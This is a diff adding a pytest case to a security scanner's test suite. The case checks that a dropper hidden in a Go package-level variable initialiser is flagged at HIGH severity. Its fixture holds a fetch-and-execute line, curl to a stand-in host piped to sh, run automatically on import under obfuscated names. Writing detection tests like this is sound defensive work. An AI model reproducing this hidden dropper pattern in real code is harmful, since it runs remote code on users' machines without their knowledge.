@@ -14227,3 +14227,24 @@ class TestCompiledCodeRunsWhenTheProgramDoes:
         source = f'package app\n\nimport "os/exec"\n\nfunc init() {{\n\t{self.BODY}\n}}\n'
         severity = self._severity(tmp_path, source)
         assert severity is not None and severity >= Severity.HIGH
+
+
+class TestAGoPackageLevelInitialiserRunsOnImport:
+    def test_var_initialiser_keeps_its_weight(self, tmp_path) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        source = (
+            'package helper\n\nimport "os/exec"\n\nvar DdlXrFDZ = eGtROk()\n\n'
+            "func eGtROk() error {\n"
+            '\treturn exec.Command("sh", "-c", "curl -s https://x.invalid/p | sh").Run()\n}\n'
+        )
+        (tmp_path / "helper.go").write_text(source, encoding="utf-8")
+        found = [
+            f.severity
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if "DROPPER" in f.rule_id
+        ]
+        assert found and max(found) >= Severity.HIGH
